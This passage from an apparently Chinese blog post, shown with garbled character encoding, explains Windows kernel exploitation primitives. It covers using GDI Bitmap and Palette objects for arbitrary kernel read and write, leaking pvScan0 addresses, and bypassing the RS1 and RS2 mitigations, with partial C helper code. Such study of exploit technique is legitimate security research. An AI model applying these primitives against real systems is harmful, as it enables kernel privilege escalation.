<li>CreateBitmap åˆ›å»ºä¸¤ä¸ª Bitmapï¼Œè·å¾—ä¸¤ä¸ªå¥æŸ„ hManager å’Œ hWorker</li>
<li>è·å– hManager å’Œ hWorker çš„ pvScan0 åœ°å€</li>
<li>åˆ©ç”¨ä¸€æ¬¡ä»»æ„åœ°å€å†™çš„èƒ½åŠ›ï¼Œä½¿ hManager çš„ pvScan0 çš„å€¼ä¸º hWorker çš„ pvScan0 çš„åœ°å€ï¼Œå³ *hManager_pvScan0 &#x3D; hWorker_pvScan0</li>
<li>ä»»æ„å†™ï¼ˆå®Œæˆå‘ 0x1234 åœ°å€å†™å…¥ 0xAAAAï¼‰ï¼š</li>
</ol>
<p>â€‚â€‚â€‚â€‚- åˆ©ç”¨ SetBitmapBits å‘ hManager_pvScan0 æŒ‡å‘çš„åœ°å€å†™å…¥ 0x1234</p>
<p>â€‚â€‚â€‚â€‚- åˆ©ç”¨ SetBitmapBits å‘ hWorker_pvScan0 æŒ‡å‘çš„åœ°å€å†™å…¥ 0xAAAA</p>
<ol>
<li>ä»»æ„è¯»ï¼ˆå®Œæˆè¯»å– 0x1234 åœ°å€çš„å€¼ï¼‰</li>
</ol>
<p>â€‚â€‚â€‚â€‚- åˆ©ç”¨ SetBitmapBits å‘ hManager_pvScan0 æŒ‡å‘çš„åœ°å€å†™å…¥ 0x1234</p>
<p>â€‚â€‚â€‚â€‚- åˆ©ç”¨ GetBitmapBits è¯»å– hManager_pvScan0 æŒ‡å‘çš„åœ°å€çš„å€¼</p>
<p>ä»£ç å¦‚ä¸‹ï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function">DWORD64 <span class="title">GetpvScan0Addr</span><span class="params">(HBITMAP hBitmap)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  DWORD64 tebAddr = NtCurrentTeb();</span><br><span class="line">  DWORD64 pebAddr = *(PDWORD64)((PUCHAR)tebAddr + <span class="number">0x60</span>);</span><br><span class="line">  DWORD64 gdiSharedHandleTableAddr = *(PDWORD64)((PUCHAR)pebAddr + <span class="number">0xf8</span>);</span><br><span class="line">  DWORD64 pKernelAddress = gdiSharedHandleTableAddr + ((DWORD64)hBitmap &amp; <span class="number">0xffff</span>) * <span class="number">0x18</span>;</span><br><span class="line">  DWORD64 surfObj = pKernelAddress + <span class="number">0x18</span>;</span><br><span class="line">  DWORD64 pvScan0Addr = surfObj + <span class="number">0x38</span>;</span><br><span class="line">  <span class="keyword">return</span> pvScan0Addr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">VOID <span class="title">ReadOOB</span><span class="params">(HBITMAP hManager,HBITMAP hWorker,DWORD64 writeAddr, LPVOID readValue, <span class="keyword">int</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  SetBitmapBits(hManager,len,&amp;writeAddr);</span><br><span class="line">  GetBitmapBits(hWorker, len, readValue);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">VOID <span class="title">WriteOOB</span><span class="params">(HBITMAP hManager, HBITMAP hWorker, DWORD64 writeAddr, LPVOID writeValue, <span class="keyword">int</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  SetBitmapBits(hManager, len, &amp;writeAddr);</span><br><span class="line">  SetBitmapBits(hWorker, len, writeValue);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  HBITMAP hManager = CreateBitmap(<span class="number">0x20</span>, <span class="number">0x20</span>, <span class="number">0x1</span>, <span class="number">0x8</span>, <span class="literal">NULL</span>);</span><br><span class="line">  HBITMAP hWorker = CreateBitmap(<span class="number">0x20</span>, <span class="number">0x20</span>, <span class="number">0x1</span>, <span class="number">0x8</span>, <span class="literal">NULL</span>);</span><br><span class="line">  DWORD64 hManager_pvScan0 = GetpvScan0Addr(hManager);</span><br><span class="line">  DWORD64 hWorker_pvScan0 = GetpvScan0Addr(hWorker);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="1-3-ç»•è¿‡-RS1-ç¼“è§£æªæ–½ï¼ˆ-lt-1703ï¼‰"><a href="#1-3-ç»•è¿‡-RS1-ç¼“è§£æªæ–½ï¼ˆ-lt-1703ï¼‰" class="headerlink" title="1.3 ç»•è¿‡ RS1 ç¼“è§£æªæ–½ï¼ˆ&lt;1703ï¼‰"></a>1.3 ç»•è¿‡ RS1 ç¼“è§£æªæ–½ï¼ˆ&lt;1703ï¼‰</h3><p>Windows RS1 å¯¹ Bitmap åšäº†ç¼“è§£æªæ–½ï¼Œ<code>GdiSharedHandleTable </code>ä¸å†é€éœ²å†…æ ¸åœ°å€ã€‚ï¼Œå› æ­¤é€šè¿‡ pKernelAddress æ‰¾åˆ° pvScan0 åœ°å€çš„æ–¹æ³•å¤±æ•ˆäº†ã€‚</p>
<p>Windows ä¸­å…±æœ‰ä¸‰ç§ç±»å‹çš„å¯¹è±¡ï¼Œåˆ†åˆ«æ˜¯ User objectã€GDI objectã€Kernel objectã€‚Bitmap å±äº GDI objectï¼Œå­˜åœ¨æ¢é¡µå¯¹è±¡æ± :</p>
<p><a target="_blank" rel="noopener" href="https://ryze-1258886299.cos.ap-beijing.myqcloud.com/20220329100224.png"><img data-src="https://ryze-1258886299.cos.ap-beijing.myqcloud.com/20220329100224.png" alt="img"></a></p>
<p>Accelerator table å¯¹è±¡å±äº User objectï¼Œä¹Ÿå­˜åœ¨äºæ¢é¡µä¼šè¯æ± ä¸­ã€‚Accelerator table å¯¹è±¡åœ°å€å¯ä»¥é€šè¿‡ pKernel è·å¾—ï¼Œå› æ­¤å¦‚æœå¯ä»¥è®© Bitmap å¯¹è±¡é‡ç”¨ Accelerator table å¯¹è±¡ï¼Œå°±å¯ä»¥å†æ¬¡æ‰¾åˆ° pvScan0 åœ°å€ã€‚</p>
<p><strong>è·å–å¯¹è±¡åœ°å€</strong></p>
<p>user32.dll æœ‰ä¸€ä¸ªå…¨å±€å˜é‡ç»“æ„â€”gSharedInfoï¼Œç»“æ„å¦‚ä¸‹</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">SHAREDINFO</span></span></span><br><span class="line"><span class="class">&#123;</span> </span><br><span class="line">  PSERVERINFO  psi;</span><br><span class="line">  PHANDLEENTRY aheList;</span><br><span class="line">  ULONG_PTR    HeEntrySize;</span><br><span class="line">  PDISPLAYINFO pDisplayInfo;</span><br><span class="line">  ULONG_PTR    ulSharedDelta;</span><br><span class="line">  WNDMSG       awmControl[<span class="number">27</span>];</span><br><span class="line">  WNDMSG       awmControl[<span class="number">31</span>];</span><br><span class="line">  WNDMSG       DefWindowMsgs;</span><br><span class="line">  WNDMSG       DefWindowSpecMsgs;</span><br><span class="line">&#125; SHAREDINFO, *PSHAREDINFO;</span><br></pre></td></tr></table></figure>

<p>ahelist æ˜¯ä¸€ä¸ªæŒ‡å‘ä¸€å¼ ç»“æ„ä¸º USER_HANDLE_ENTRY çš„è¡¨ï¼Œå…¶ç»“æ„å¦‚ä¸‹ï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">USER_HANDLE_ENTRY</span> &#123;</span></span><br><span class="line">    <span class="keyword">void</span>* pKernel;</span><br><span class="line">    <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">        PVOID pi;</span><br><span class="line">        PVOID pti;</span><br><span class="line">        PVOID ppi;</span><br><span class="line">    &#125;;</span><br><span class="line">    BYTE type;</span><br><span class="line">    BYTE flags;</span><br><span class="line">    WORD generation;</span><br><span class="line">&#125; USER_HANDLE_ENTRY, * PUSER_HANDLE_ENTRY;</span><br></pre></td></tr></table></figure>

<p>é¦–åœ°å€å°±æŒ‡å‘ pKernelï¼Œä¸ GDICELL ç»“æ„æ•°ç»„ä¸­çš„ pKernelAddress ä¸€æ ·ï¼Œé€šè¿‡ç›¸åŒçš„è®¡ç®—æ–¹å¼å°±å¯ä»¥è·å¾—è¯¥å¯¹è±¡åœ°å€ã€‚</p>
<p><strong>å¯¹è±¡é‡ç”¨</strong></p>
<p>ç±»ä¼¼å †å–·çš„æ‰‹æ³•ï¼Œåˆ›å»ºå¤šä¸ª Accelerator table å¯¹è±¡å†é”€æ¯ï¼Œå†åˆ›å»º Bitmap å¯¹è±¡ï¼Œä½¿å…¶å¤ç”¨ã€‚</p>
<h3 id="1-4-ç»•è¿‡-RS2-ç¼“è§£æªæ–½ï¼ˆ-lt-1709ï¼‰"><a href="#1-4-ç»•è¿‡-RS2-ç¼“è§£æªæ–½ï¼ˆ-lt-1709ï¼‰" class="headerlink" title="1.4 ç»•è¿‡ RS2 ç¼“è§£æªæ–½ï¼ˆ&lt;1709ï¼‰"></a>1.4 ç»•è¿‡ RS2 ç¼“è§£æªæ–½ï¼ˆ&lt;1709ï¼‰</h3><p>å¾®è½¯åœ¨ RS2 æŠŠ HADNLE_ENRTYç»“æ„ä½“çš„pkernel ç¦æ‰äº†ï¼Œå› æ­¤é€šè¿‡ Accelerator table é‡ç”¨çš„æ–¹å¼ä¹Ÿå°±å¤±æ•ˆäº†ã€‚</p>
<p>å¾®è½¯çš„ç¼“è§£æªæ–½è¦å»ç»•è¿‡ï¼Œå…¶æœ¬è´¨ä¹Ÿæ˜¯æ³„éœ² Windows å¯¹è±¡ï¼Œé‡Šæ”¾å†ç”³è¯· Bitmapï¼Œä»è€Œæ³„éœ² Bitmap å¯¹è±¡çš„åœ°å€ã€‚</p>
<p>è¿™é‡Œå°±æ¶‰åŠåˆ°ä¸¤ä¸ªæ¦‚å¿µï¼Œä¸€ä¸ªæ˜¯çª—å£èœå•å lpszMenuNameï¼Œä¸€ä¸ªæ˜¯ HMValidateHandleã€‚</p>
<p>HMValidateHandle å¯ä»¥é€šè¿‡ä¼ å…¥çª—å£å¥æŸ„ï¼Œè·å¾—åœ¨æ¡Œé¢å †çš„ tagWnd æŒ‡é’ˆï¼Œé€šè¿‡è¿™ä¸ªæŒ‡é’ˆå¯ä»¥æ³„éœ²å‡ºå†…æ ¸åœ°å€ï¼ˆè¯¦æƒ…è§<a target="_blank" rel="noopener" href="https://ryze-t.com/posts/2021/09/08/HMValidateHandle.html%EF%BC%89%E3%80%82">https://ryze-t.com/posts/2021/09/08/HMValidateHandle.htmlï¼‰ã€‚</a></p>
<p>lpszMenuName æŒ‡å‘çš„æ˜¯å­˜æ”¾èœå•åçš„ paged poolï¼Œé€šè¿‡ tagWnd æ‰¾åˆ° lpszMenuName å¯¹è±¡çš„åœ°å€ï¼Œç±»ä¼¼äº Accelerator table çš„å½¢å¼è·å–åˆ° pvScan0 çš„åœ°å€ã€‚</p>
<h3 id="2-1-PaletteåŸºç¡€æ¦‚å¿µ"><a href="#2-1-PaletteåŸºç¡€æ¦‚å¿µ" class="headerlink" title="2.1 PaletteåŸºç¡€æ¦‚å¿µ"></a>2.1 PaletteåŸºç¡€æ¦‚å¿µ</h3><p>Bitmap çš„é—®é¢˜åœ¨ RS3(1709) ç»ˆäºè¢«è§£å†³ï¼Œäºæ˜¯åˆå‡ºç°äº†æ–°çš„è§£å†³åŠæ³•â€”Paletteï¼ŒPalette çš„åˆ©ç”¨æ–¹å¼ä¸ Bitmapç›¸ä¼¼</p>
<p>Palette ç»“æ„å¦‚ä¸‹ï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">PALETTE64</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    BASEOBJECT64      BaseObject;    <span class="comment">// 0x00</span></span><br><span class="line">    FLONG           flPal;         <span class="comment">// 0x18</span></span><br><span class="line">    ULONG32           cEntries;      <span class="comment">// 0x1C</span></span><br><span class="line">    ULONG32           ulTime;        <span class="comment">// 0x20 </span></span><br><span class="line">    HDC             hdcHead;       <span class="comment">// 0x24</span></span><br><span class="line">    ULONG64        hSelected;     <span class="comment">// 0x28, </span></span><br><span class="line">    ULONG64           cRefhpal;      <span class="comment">// 0x30</span></span><br><span class="line">    ULONG64          cRefRegular;   <span class="comment">// 0x34</span></span><br><span class="line">    ULONG64      ptransFore;    <span class="comment">// 0x3c</span></span><br><span class="line">    ULONG64      ptransCurrent; <span class="comment">// 0x44</span></span><br><span class="line">    ULONG64      ptransOld;     <span class="comment">// 0x4C</span></span><br><span class="line">    ULONG32           unk_038;       <span class="comment">// 0x38</span></span><br><span class="line">    ULONG64         pfnGetNearest; <span class="comment">// 0x3c</span></span><br><span class="line">    ULONG64   pfnGetMatch;   <span class="comment">// 0x40</span></span><br><span class="line">    ULONG64           ulRGBTime;     <span class="comment">// 0x44</span></span><br><span class="line">    ULONG64       pRGBXlate;     <span class="comment">// 0x48</span></span><br><span class="line">    PALETTEENTRY    *pFirstColor;  <span class="comment">// 0x80</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">PALETTE</span> *<span class="title">ppalThis</span>;</span>     <span class="comment">// 0x88</span></span><br><span class="line">    PALETTEENTRY    apalColors[<span class="number">3</span>]; <span class="comment">// 0x90</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¯¥ç»“æ„åç§» 0x80 å¤„å­˜åœ¨ä¸€ä¸ªæŒ‡é’ˆ pFirstColorï¼ŒæŒ‡å‘çš„æ˜¯åç§» 0x90 çš„ 4 å­—èŠ‚æ•°ç»„ apalColorsã€‚</p>
<p>ç±»æ¯”ä¸ Bitmapï¼ŒpFirstColor å°±æ˜¯ pvScan0ï¼Œ apalColors[3] å°±æ˜¯ pixel Dataã€‚</p>
<p>PALETTEENTRY ç»“æ„å¦‚ä¸‹ï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">class <span class="title">PALETTEENTRY</span><span class="params">(Structure)</span>:</span></span><br><span class="line"><span class="function"> _fields_ </span>= [</span><br><span class="line">  (<span class="string">&quot;peRed&quot;</span>, BYTE),</span><br><span class="line">  (<span class="string">&quot;peGreen&quot;</span>, BYTE),</span><br><span class="line">  (<span class="string">&quot;peBlue&quot;</span>, BYTE),</span><br><span class="line">  (<span class="string">&quot;peFlags&quot;</span>, BYTE)</span><br><span class="line"> ]</span><br></pre></td></tr></table></figure>



<h3 id="2-2-CreatePalette"><a href="#2-2-CreatePalette" class="headerlink" title="2.2 CreatePalette"></a>2.2 CreatePalette</h3><p>CreatePalette åˆ›å»ºä¸€ä¸ªé€»è¾‘è°ƒè‰²æ¿ï¼Œå…·ä½“å‡½æ•°ç”¨æ³•å¦‚ä¸‹ï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">HPALETTE <span class="title">CreatePalette</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  [in] <span class="keyword">const</span> LOGPALETTE *plpal</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure>

<p>LOGPALETTE ç»“æ„å¦‚ä¸‹ï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tagLOGPALETTE</span> &#123;</span></span><br><span class="line">  WORD         palVersion;     <span class="comment">// 0x300</span></span><br><span class="line">  WORD         palNumEntries;  <span class="comment">//  palNumEntries = (size-0x90)/4</span></span><br><span class="line">  PALETTEENTRY palPalEntry[<span class="number">1</span>];</span><br><span class="line">&#125; LOGPALETTE, *PLOGPALETTE, *NPLOGPALETTE, *LPLOGPALETTE;</span><br></pre></td></tr></table></figure>

<p>å‡½æ•°ä½¿ç”¨æ¨¡æ¿å¦‚ä¸‹ï¼š</p>
<figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">HPALETTE <span class="title">createPaletteofSize</span><span class="params">(<span class="keyword">int</span> size)</span> </span>&#123;  <span class="keyword">if</span> (size &lt;= <span class="number">0x90</span>) &#123;    <span class="built_in">printf</span>(<span class="string">&quot;bad size! can&#x27;t allocate palette of size &lt; 0x90!\n&quot;</span>);    <span class="keyword">return</span> <span class="number">0</span>;  &#125;  <span class="keyword">int</span> pal_cnt = (size - <span class="number">0x90</span>) / <span class="number">4</span>;  <span class="keyword">int</span> palsize = <span class="built_in"><span class="keyword">sizeof</span></span>(LOGPALETTE) + (pal_cnt - <span class="number">1</span>) * <span class="built_in"><span class="keyword">sizeof</span></span>(PALETTEENTRY);  LOGPALETTE *lPalette = (LOGPALETTE*)<span class="built_in">malloc</span>(palsize);  <span class="built_in">memset</span>(lPalette, <span class="number">0x4</span>, palsize);  lPalette-&gt;palNumEntries = pal_cnt;  lPalette-&gt;palVersion = <span class="number">0x300</span>;  <span class="keyword">return</span> <span class="built_in">CreatePalette</span>(lPalette); &#125; </span><br></pre></td></tr></table></figure>



<h3 id="2-3-GetPaletteEntries-x2F-SetPaletteEntries"><a href="#2-3-GetPaletteEntries-x2F-SetPaletteEntries" class="headerlink" title="2.3 GetPaletteEntries&#x2F;SetPaletteEntries"></a>2.3 GetPaletteEntries&#x2F;SetPaletteEntries</h3><p>ä¸ Bitmap ç±»ä¼¼ï¼ŒPalette ä¸­ä¹Ÿæœ‰ç±»ä¼¼ APIï¼Œè®©æˆ‘ä»¬å¯ä»¥æ“ä½œ apalColors[3]ã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">UINT <span class="title">GetPaletteEntries</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  [in]  HPALETTE       hpal,        <span class="comment">// palette å¥æŸ„</span></span></span></span><br><span class="line"><span class="function"><span class="params">  [in]  UINT           iStart,      <span class="comment">// è¦æå–çš„é€»è¾‘è°ƒè‰²æ¿ä¸­çš„ç¬¬ä¸€é¡¹</span></span></span></span><br><span class="line"><span class="function"><span class="params">  [in]  UINT           cEntries,    <span class="comment">// è¦æå–çš„é€»è¾‘è°ƒè‰²æ¿ä¸­çš„é¡¹æ•°</span></span></span></span><br><span class="line"><span class="function"><span class="params">  [out] LPPALETTEENTRY pPalEntries  <span class="comment">// æ¥å—è°ƒè‰²é¡¹ç›®çš„PALETTEENTRYç»“æ„æ•°ç»„çš„æŒ‡é’ˆï¼Œè¯¥æ•°ç»„æ‰€å«ç»“æ„çš„æ•°ç›®è‡³å°‘ä¸ºnEntrieså‚æ•°æŒ‡å®šçš„æ•°ç›®</span></span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br><span class="line"><span class="function">UINT <span class="title">SetPaletteEntries</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  [in] HPALETTE           hpal,        <span class="comment">// palette å¥æŸ„</span></span></span></span><br><span class="line"><span class="function"><span class="params">  [in] UINT               iStart,      <span class="comment">// è¦è®¾ç½®çš„é€»è¾‘è°ƒè‰²æ¿ä¸­çš„ç¬¬ä¸€é¡¹</span></span></span></span><br><span class="line"><span class="function"><span class="params">  [in] UINT               cEntries,    <span class="comment">// è¦è®¾ç½®çš„é€»è¾‘è°ƒè‰²æ¿ä¸­çš„é¡¹æ•°</span></span></span></span><br><span class="line"><span class="function"><span class="params">  [in] <span class="keyword">const</span> PALETTEENTRY *pPalEntries <span class="comment">// æŒ‡å‘åŒ…å«RGBå€¼å’Œæ ‡å¿—çš„PALETTEENTRYç»“æ„æ•°ç»„çš„ç¬¬ä¸€ä¸ªå…ƒç´ </span></span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure>



<h3 id="2-4-åˆ©ç”¨æ€è·¯"><a href="#2-4-åˆ©ç”¨æ€è·¯" class="headerlink" title="2.4 åˆ©ç”¨æ€è·¯"></a>2.4 åˆ©ç”¨æ€è·¯</h3><p>æ•´ä½“åˆ©ç”¨æ€è·¯ä¸ Bitmap ç±»ä¼¼ã€‚</p>
<p>æ–°å»ºä¸¤ä¸ª Palette objectï¼šhWorker å’Œ hManagerï¼Œåˆ©ç”¨å †å–·å°„çš„æ‰‹æ³•è·å–åˆ°ä¸¤ä¸ªå¯¹è±¡çš„pFirstColoræŒ‡é’ˆçš„å†…æ ¸åœ°å€ï¼Œå°†hManagerçš„pFirstColoræŒ‡é’ˆæŒ‡å‘hWorkerçš„pFirstColoræŒ‡é’ˆçš„å­˜æ”¾åœ°å€ï¼Œåˆ©ç”¨ SetPaletteEntries å°† hWorker.pFirstColor ä¿®æ”¹ä¸º 0x1234ï¼Œåˆ©ç”¨ SetPaletteEntries å¾€ 0x1234 ä¸­å†™å…¥ 0xABCDï¼›åˆ©ç”¨ SetPaletteEntries å°† hWorker.pFirstColor ä¿®æ”¹ä¸º 0x4321ï¼Œåˆ©ç”¨ GetPaletteEntries ä» 0x4321 ä¸­è¯»å–ç›¸åº”å€¼ã€‚</p>
<!-- flag of hidden posts -->
    </div>

    
    
    

    <footer class="post-footer">
          <div class="reward-container">
  <div>Buy me a coffee</div>
  <button onclick="document.querySelector('.post-reward').classList.toggle('active');">
    èµèµ
  </button>
  <div class="post-reward">
      <div>
        <img src="/images/wechat.jpg" alt="Catecat å¾®ä¿¡">
        <span>å¾®ä¿¡</span>
      </div>
      <div>
        <img src="/images/alipay.jpg" alt="Catecat æ”¯ä»˜å®">
        <span>æ”¯ä»˜å®</span>
      </div>

  </div>
</div>

          

<div class="post-copyright">
<ul>
  <li class="post-copyright-author">
      <strong>æœ¬æ–‡ä½œè€…ï¼š </strong>Catecat
  </li>
  <li class="post-copyright-link">
      <strong>æœ¬æ–‡é“¾æ¥ï¼š</strong>
      <a href="https://directoree.github.io/post/Windows-GUI-Subsystem2/" title="GUI Subsystem ç”¨æˆ·å›è°ƒ">https://directoree.github.io/post/Windows-GUI-Subsystem2/</a>
  </li>
  <li class="post-copyright-license">
    <strong>ç‰ˆæƒå£°æ˜ï¼š </strong>æœ¬åšå®¢æ‰€æœ‰æ–‡ç« é™¤ç‰¹åˆ«å£°æ˜å¤–ï¼Œå‡é‡‡ç”¨ <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> è®¸å¯åè®®ã€‚è½¬è½½è¯·æ³¨æ˜å‡ºå¤„ï¼
  </li>
</ul>
</div>

          <div class="post-tags">
              <a href="/tags/Windows%E5%86%85%E6%A0%B8/" rel="tag"><i class="fa fa-tag"></i> Windowså†…æ ¸</a>
              <a href="/tags/GUI/" rel="tag"><i class="fa fa-tag"></i> GUI</a>
          </div>

        

    </footer>
  </article>
</div>






      
    <div class="comments" id="valine-comments"></div>

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      const activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      const commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

    </div>
  </main>

  <footer class="footer">
    <div class="footer-inner">
      

      

<div class="copyright">
  
  &copy; 2018 â€“ 
  <span itemprop="copyrightYear">2023</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Catecat</span>
</div>
<div class="wordcount">
  <span class="post-meta-item">
    <span class="post-meta-item-icon">
      <i class="fa fa-chart-line"></i>
    </span>
      <span>ç«™ç‚¹æ€»å­—æ•°ï¼š</span>
    <span title="ç«™ç‚¹æ€»å­—æ•°">1.3m</span>
  </span>
  <span class="post-meta-item">
    <span class="post-meta-item-icon">
      <i class="fa fa-coffee"></i>
    </span>
      <span>ç«™ç‚¹é˜…è¯»æ—¶é•¿ &asymp;</span>
    <span title="ç«™ç‚¹é˜…è¯»æ—¶é•¿">19:34</span>
  </span>
</div>
<div class="busuanzi-count">
    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="fa fa-user"></i>
      </span>
      <span class="site-uv" title="æ€»è®¿å®¢é‡">
        <span id="busuanzi_value_site_uv"></span>
      </span>
    </span>
    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="fa fa-eye"></i>
      </span>
      <span class="site-pv" title="æ€»è®¿é—®é‡">
        <span id="busuanzi_value_site_pv"></span>
      </span>
    </span>
</div>
  <div class="powered-by">ç”± <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/mist/" class="theme-link" rel="noopener" target="_blank">NexT.Mist</a> å¼ºåŠ›é©±åŠ¨
  </div>

    </div>
  </footer>

  
  <script src="//cdn.jsdelivr.net/npm/animejs@3.2.0/lib/anime.min.js"></script>
  <script src="//cdn.jsdelivr.net/npm/@next-theme/pjax@0.4.0/pjax.min.js"></script>
  <script src="//cdn.jsdelivr.net/npm/lozad@1.15.0/dist/lozad.min.js"></script>
<script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script>
  <script>
var pjax = new Pjax({
  selectors: [
    'head title',
    '.page-configurations',
    '.main-inner',
    '.post-toc-wrap',
    '.languages',
    '.pjax'
  ],
  analytics: false,
  cacheBust: false,
  scrollRestoration: false,
  scrollTo: !CONFIG.bookmark.enable
});

document.addEventListener('pjax:success', () => {
  pjax.executeScripts(document.querySelectorAll('script[data-pjax], .pjax script'));
  NexT.boot.refresh();
  // Define Motion Sequence & Bootstrap Motion.
  if (CONFIG.motion.enable) {
    NexT.motion.integrator
      .init()
      .add(NexT.motion.middleWares.subMenu)
      .add(NexT.motion.middleWares.postList)
      .bootstrap();
  }
  const hasTOC = document.querySelector('.post-toc');
  document.querySelector('.sidebar-inner').classList.toggle('sidebar-nav-active', hasTOC);
  document.querySelector(hasTOC ? '.sidebar-nav-toc' : '.sidebar-nav-overview').click();
  NexT.utils.updateSidebarPosition();
});
</script>


  




  <script src="/js/local-search.js"></script>








<script data-pjax>
document.querySelectorAll('.pdfobject-container').forEach(element => {
  const url = element.dataset.target;
  const pdfOpenParams = {
    navpanes : 0,
    toolbar  : 0,
    statusbar: 0,
    pagemode : 'thumbs',
    view     : 'FitH'
  };
  const pdfOpenFragment = '#' + Object.entries(pdfOpenParams).map(([key, value]) => `${key}=${encodeURIComponent(value)}`).join('&');
